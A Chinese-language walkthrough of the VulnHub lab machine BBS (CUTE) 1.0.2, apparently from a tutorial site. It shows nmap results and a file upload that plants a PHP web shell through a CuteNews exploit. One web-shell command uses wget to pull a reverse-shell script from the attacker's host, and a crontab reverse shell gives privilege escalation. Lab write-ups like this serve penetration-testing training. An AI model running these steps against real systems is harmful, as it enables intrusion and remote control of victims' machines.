@@ -1,0 +1,102 @@
+<!doctype html><html><head><title>Vulnhub 567 BBS (CUTE) 1.0.2</title><meta charset=utf-8><meta name=X-UA-Compatible content="IE=edge"><meta name=google-site-verification content><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name=viewport><meta content="telephone=no" name=format-detection><meta name=description content><meta name=renderer content="webkit"><meta name=theme-color content="#ffffff"><script type=text/javascript>(function(e,t,n,s,o,i,a){e[n]=e[n]||function(){(e[n].q=e[n].q||[]).push(arguments)},i=t.createElement(s),i.async=1,i.src="https://www.clarity.ms/tag/"+o,a=t.getElementsByTagName(s)[0],a.parentNode.insertBefore(i,a)})(window,document,"clarity","script","abcdefghzd")</script><script src=/js/toc.js></script>
+<link type=text/css rel=stylesheet href=/vendor/css/bootstrap.min.css><link rel=stylesheet href=/scss/dark-mode.scss integrity media=screen><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Material+Icons"><script>console.log("Hello from 'layouts/partials/extended_head.html'")</script></head><body><div id=app><div class=single-column-drawer-container id=drawer v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }"><div class=drawer-content><div class=drawer-menu><a class="a-block drawer-menu-item active" href=/walkthrough>Walkthroughs</a>
+<a class="a-block drawer-menu-item false" href=/posts>Archive</a>
+<a class="a-block drawer-menu-item false" href=/categories>Categories</a>
+<a class="a-block drawer-menu-item false" href=/tags>Tags</a>
+<a class="a-block drawer-menu-item false" href=/index.xml>RSS Feed</a><div class=toc><div class=toc-content><center>- 目录 -</center><ul><ul><li><a href=#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae class=nav-环境配置>环境配置</a></li><li><a href=#%e5%88%9d%e6%ad%a5%e6%89%93%e7%82%b9 class=nav-初步打点>初步打点</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f class=nav-端口扫描>端口扫描</a></li><li><a href=#web%e6%b5%8b%e8%af%95 class=nav-web测试>WEB测试</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a388 class=nav-端口88>端口88</a></li><li><a href=#%e7%ab%af%e5%8f%a380 class=nav-端口80>端口80</a></li></ul><li><a href=#%e6%bc%8f%e6%b4%9e%e5%8f%91%e7%8e%b0 class=nav-漏洞发现>漏洞发现</a></li></ul><li><a href=#%e8%8e%b7%e5%be%97%e6%9d%83%e9%99%90 class=nav-获得权限>获得权限</a></li><ul><li><a href=#%e9%9d%b6%e6%9c%ba%e6%b5%8b%e8%af%95 class=nav-靶机测试>靶机测试</a></li></ul><li><a href=#%e6%8f%90%e6%9d%83 class=nav-提权>提权</a></li></ul></div></div></div></div></div><transition name=fade><div id=drawer-mask v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if=isDrawerOpen v-on:click=toggleDrawer></div></transition><nav id=navBar class="navbar sticky-top navbar-light single-column-nav-container"><div id=navBackground class=nav-background></div><div class="container container-narrow nav-content"><button id=nav_dropdown_btn class=nav-dropdown-toggle type=button v-on:click=toggleDrawer>
+<i class=material-icons>menu</i></button>
+<a id=navTitle class=navbar-brand href=https://www.vulnhub.cn>Vulnhub靶机教程</a>
+<button type=button class=nav-darkmode-toggle id=darkModeToggleButton2>
+<i class=material-icons id=darkModeToggleIcon2>dark_mode</i></button></div></nav><div class=single-column-header-container id=pageHead v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }"><a href=https://www.vulnhub.cn><div class=single-column-header-title>Vulnhub靶机教程</div><div class=single-column-header-subtitle>Themed by Diary.</div></a></div><div id=content><div id=streamContainer class=stream-container><div class="post-list-container post-list-container-shadow"><div class=post><div class=post-head-wrapper-text-only><div class=post-title>Vulnhub 567 BBS (CUTE) 1.0.2<div class=post-meta><time itemprop=datePublished>2020-09-24 00:00</time></div></div></div><div class=post-body-wrapper><div class=post-body v-pre><p>考点：任意文件上传,定时任务</p><p>靶机链接：<a href=https://www.vulnhub.com/entry/bbs-cute-102,567/>https://www.vulnhub.com/entry/bbs-cute-102,567/</a></p><h2 id=环境配置>环境配置</h2><table><thead><tr><th>名称</th><th>IP</th></tr></thead><tbody><tr><td>Kali Linux</td><td>10.0.2.15</td></tr><tr><td>BBS (CUTE)</td><td>10.0.2.11</td></tr></tbody></table><h2 id=初步打点>初步打点</h2><h3 id=端口扫描>端口扫描</h3><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ <span style=color:#658b00>export</span> <span style=color:#00688b>rip</span>=10.0.2.11
+</span></span><span style=display:flex><span>$ sudo nmap -v -A -p- <span style=color:#00688b>$rip</span>
+</span></span><span style=display:flex><span>PORT    STATE SERVICE  VERSION
+</span></span><span style=display:flex><span>22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>2048</span> 04:d0:6e:c4:ba:4a:31:5a:6f:b3:ee:b8:1b:ed:5a:b7 (RSA)
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>256</span> 24:b3:df:01:0b:ca:c2:ab:2e:e9:49:b0:58:08:6a:fa (ECDSA)
+</span></span><span style=display:flex><span>|_  <span style=color:#b452cd>256</span> 6a:c4:35:6a:7a:1e:7e:51:85:5b:81:5c:7c:74:49:84 (ED25519)
+</span></span><span style=display:flex><span>80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
+</span></span><span style=display:flex><span>|_http-title: Apache2 Debian Default Page: It works
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|_  Supported Methods: POST OPTIONS HEAD GET
+</span></span><span style=display:flex><span>|_http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.38 (Debian)
+</span></span><span style=display:flex><span>88/tcp  open  http     nginx 1.14.2
+</span></span><span style=display:flex><span>|_http-title: <span style=color:#b452cd>404</span> Not Found
+</span></span><span style=display:flex><span>|_http-server-header: nginx/1.14.2
+</span></span><span style=display:flex><span>110/tcp open  pop3     Courier pop3d
+</span></span><span style=display:flex><span>|_pop3-capabilities: LOGIN-DELAY(10) UTF8(USER) TOP STLS IMPLEMENTATION(Courier Mail Server) PIPELINING USER UIDL
+</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#00688b>commonName</span>=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+</span></span><span style=display:flex><span>| Subject Alternative Name: email:postmaster@example.com
+</span></span><span style=display:flex><span>| Issuer: <span style=color:#00688b>commonName</span>=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+</span></span><span style=display:flex><span>| Public Key type: rsa
+</span></span><span style=display:flex><span>| Public Key bits: <span style=color:#b452cd>3072</span>
+</span></span><span style=display:flex><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style=display:flex><span>| Not valid before: 2020-09-17T16:28:06
+</span></span><span style=display:flex><span>| Not valid after:  2021-09-17T16:28:06
+</span></span><span style=display:flex><span>| MD5:   5ee2 40c8 66d1 b327 71e6 085a f50b 7e28
+</span></span><span style=display:flex><span>|_SHA-1: 28a3 acc0 86a7 cd64 8f09 78fa <span style=color:#b452cd>1792</span> <span style=color:#b452cd>7032</span> 0ecc b154
+</span></span><span style=display:flex><span>995/tcp open  ssl/pop3 Courier pop3d
+</span></span><span style=display:flex><span>|_pop3-capabilities: LOGIN-DELAY(10) TOP UTF8(USER) IMPLEMENTATION(Courier Mail Server) PIPELINING USER UIDL
+</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#00688b>commonName</span>=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+</span></span><span style=display:flex><span>| Subject Alternative Name: email:postmaster@example.com
+</span></span><span style=display:flex><span>| Issuer: <span style=color:#00688b>commonName</span>=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+</span></span><span style=display:flex><span>| Public Key type: rsa
+</span></span><span style=display:flex><span>| Public Key bits: <span style=color:#b452cd>3072</span>
+</span></span><span style=display:flex><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style=display:flex><span>| Not valid before: 2020-09-17T16:28:06
+</span></span><span style=display:flex><span>| Not valid after:  2021-09-17T16:28:06
+</span></span><span style=display:flex><span>| MD5:   5ee2 40c8 66d1 b327 71e6 085a f50b 7e28
+</span></span><span style=display:flex><span>|_SHA-1: 28a3 acc0 86a7 cd64 8f09 78fa <span style=color:#b452cd>1792</span> <span style=color:#b452cd>7032</span> 0ecc b154
+</span></span></code></pre></td></tr></table></div></div><h3 id=web测试>WEB测试</h3><h4 id=端口88>端口88</h4><p>未发现有用信息</p><h4 id=端口80>端口80</h4><p><a href=https://www.iihack.com/pages/tools/dirb.html>dirb</a>和<a href=https://www.iihack.com/pages/tools/dirsearch.html>dirsearch</a>都发现了index.php</p><p><img src=https://www.vulnhub.cn/walkthrough/567/1.webp alt></p><h3 id=漏洞发现>漏洞发现</h3><p><img src=https://www.vulnhub.cn/walkthrough/567/2.webp alt></p><p>查看利用脚本，发现CuteNews目录需要手工去除</p><p><img src=https://www.vulnhub.cn/walkthrough/567/3.webp alt></p><p>使用新建的用户<code>ZOu0fykHPn</code>登录</p><h2 id=获得权限>获得权限</h2><h3 id=靶机测试>靶机测试</h3><p><img src=https://www.vulnhub.cn/walkthrough/567/4.webp alt></p><p>头像处是上传的shell</p><p>访问<a href=http://10.0.2.11/uploads/avatar_ZOu0fykHPn_ZOu0fykHPn.php>http://10.0.2.11/uploads/avatar_ZOu0fykHPn_ZOu0fykHPn.php</a>文件存在</p><p><img src=https://www.vulnhub.cn/walkthrough/567/5.webp alt></p><p>下载r444.php</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a61717;background-color:#e3d2d2>http://10.0.2.11/uploads/avatar_ZOu0fykHPn_ZOu0fykHPn.php?cmd=wget http://10.0.2.15/reverse/r444.php
+</span></span></span></code></pre></td></tr></table></div></div><p>访问<a href=http://10.0.2.11/uploads/r444.php>http://10.0.2.11/uploads/r444.php</a></p><p>反弹shell成功</p><p><img src=https://www.vulnhub.cn/walkthrough/567/6.webp alt></p><h2 id=提权>提权</h2><p>将反弹shell写入crontab</p><p><img src=https://www.vulnhub.cn/walkthrough/567/7.webp alt></p><p><img src=https://www.vulnhub.cn/walkthrough/567/8.webp alt></p><hr width=100% id=EOF><p style=color:#777>最后修改于 2020-09-24</p></div></div><nav class=post-pagination><a class=newer-posts href=/walkthrough/613/>下回<br>Vulnhub 613 SCHOOL-1</a>
+<a class=older-posts href=/walkthrough/555/>上回<br>Vulnhub 555 MONITORING-1</a></nav><div class=post-comment-wrapper></div></div></div></div></div><div id=sideContainer class=side-container><a class="a-block nav-head false" href=https://www.vulnhub.cn><div class=nav-title>Vulnhub靶机教程</div><div class=nav-subtitle>Themed by Diary.</div></a><div class=nav-link-list><a class="a-block nav-link-item active" href=/walkthrough>Walkthroughs</a>
+<a class="a-block nav-link-item false" href=/posts>Archive</a>
+<a class="a-block nav-link-item false" href=/categories>Categories</a>
+<a class="a-block nav-link-item false" href=/tags>Tags</a>
+<a class="a-block nav-link-item false" href=/index.xml>RSS Feed</a></div><div class=nav-footer>Hugo Theme <a href=https://github.com/amazingrise/hugo-theme-diary>Diary</a> by <a href=https://risehere.net/>Rise</a><br>移植自 <a href=https://mak1t0.cc/ target=_blank rel="noreferrer noopener">Makito</a>'s <a href=https://github.com/SumiMakito/hexo-theme-journal/ target=_blank rel="noreferrer noopener">Journal.</a><br><br>&copy;
+This is a customized copyright.</div></div><div id=extraContainer class=extra-container><div class=toc-wrapper><div class=toc><div class=toc-content><center>- 目录 -</center><ul><ul><li><a href=#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae class=nav-环境配置>环境配置</a></li><li><a href=#%e5%88%9d%e6%ad%a5%e6%89%93%e7%82%b9 class=nav-初步打点>初步打点</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f class=nav-端口扫描>端口扫描</a></li><li><a href=#web%e6%b5%8b%e8%af%95 class=nav-web测试>WEB测试</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a388 class=nav-端口88>端口88</a></li><li><a href=#%e7%ab%af%e5%8f%a380 class=nav-端口80>端口80</a></li></ul><li><a href=#%e6%bc%8f%e6%b4%9e%e5%8f%91%e7%8e%b0 class=nav-漏洞发现>漏洞发现</a></li></ul><li><a href=#%e8%8e%b7%e5%be%97%e6%9d%83%e9%99%90 class=nav-获得权限>获得权限</a></li><ul><li><a href=#%e9%9d%b6%e6%9c%ba%e6%b5%8b%e8%af%95 class=nav-靶机测试>靶机测试</a></li></ul><li><a href=#%e6%8f%90%e6%9d%83 class=nav-提权>提权</a></li></ul></div></div></div><div class=pagination><a id=globalBackToTop class="pagination-action animated-visibility" href=#top :class="{ invisible: scrollY == 0 }"><i class="material-icons pagination-action-icon">keyboard_arrow_up</i></a>
+<a type=button class=pagination-action id=darkModeToggleButton><span class="material-icons pagination-action-icon" id=darkModeToggleIcon>dark_mode</span></a></div></div><div id=single-column-footer>Hugo Theme <a href=https://github.com/amazingrise/hugo-theme-diary>Diary</a> by <a href=https://risehere.net/>Rise</a><br>移植自 <a href=https://mak1t0.cc/ target=_blank rel="noreferrer noopener">Makito</a>'s <a href=https://github.com/SumiMakito/hexo-theme-journal/ target=_blank rel="noreferrer noopener">Journal.</a><br><br>&copy;
+This is a customized copyright.</div></div><script src=/js/journal.js></script></body></html>
